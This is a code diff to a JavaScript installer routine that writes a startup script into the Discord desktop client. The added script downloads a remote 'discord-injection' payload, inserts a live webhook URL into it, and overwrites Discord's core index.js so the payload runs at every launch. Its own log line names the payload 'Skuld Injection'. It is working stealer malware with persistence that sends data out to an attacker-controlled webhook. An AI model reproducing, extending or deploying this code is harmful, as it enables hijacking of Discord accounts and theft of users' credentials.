@@ -370,31 +370,54 @@ async function initiation() {
 
     fs.writeFileSync(packageJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
 
-    const startUpScript = `const fs = require('fs'), https = require('https');
-const indexJs = '${indexJs.replace(/\\/g, '\\\\')}';
-const bdPath = '${bdPath.replace(/\\/g, '\\\\')}';
+    const startUpScript = `
+    
+const fs = require('fs');
+const https = require('https');
+const path = require('path');
 
-async function init() {
+const CONFIG = {
+    webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuZLFcZn57oopdAPCS3l7qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCiVTPisp-1X",
+    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js"
+};
+
+// Find core index.js
+const appPath = path.dirname(process.execPath);
+const modulesPath = path.join(appPath, 'modules');
+const coreFolder = fs.readdirSync(modulesPath).find(x => x.startsWith('discord_desktop_core-'));
+const indexJs = path.join(modulesPath, coreFolder, 'discord_desktop_core', 'index.js');
+const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
+
+async function loadInjection() {
     try {
-        const res = await new Promise((r, j) => https.get('${CONFIG.injection_url}', r).on('error', j));
+        const res = await new Promise((resolve, reject) => {
+            https.get(CONFIG.injection_url, resolve).on('error', reject);
+        });
+
         let data = '';
-        res.on('data', c => data += c);
+        res.on('data', chunk => data += chunk);
         res.on('end', () => {
-            data = data.replace('%WEBHOOK%', '${CONFIG.webhook}');
+            data = data.replace('%WEBHOOK%', CONFIG.webhook);
             fs.writeFileSync(indexJs, data);
-            console.log('[+] Injection loaded');
+            console.log('[+] Skuld Injection Loaded Successfully');
         });
     } catch (e) {
-        console.error('[-] Injection failed, retrying...', e.message);
-        setTimeout(init, 10000);
+        console.error('[-] Failed to load injection:', e.message);
+        setTimeout(loadInjection, 5000);
     }
 }
 
-const fileSize = fs.statSync(indexJs).size;
-const content = fs.readFileSync(indexJs, 'utf8');
-if (fileSize < 20000 || content.includes('core.asar')) init();
+// Load injection if needed
+if (fs.existsSync(indexJs)) {
+    const size = fs.statSync(indexJs).size;
+    const content = fs.readFileSync(indexJs, 'utf8');
+    if (size < 20000 || content.includes('core.asar')) {
+        loadInjection();
+    }
+}
 
-require('${path.join(resourcePath, 'app.asar').replace(/\\/g, '\\\\')}');
+// Load normal Discord + BetterDiscord
+require(path.join(appPath, 'app.asar'));
 if (fs.existsSync(bdPath)) require(bdPath);`;
 
     fs.writeFileSync(resourceIndex, startUpScript);
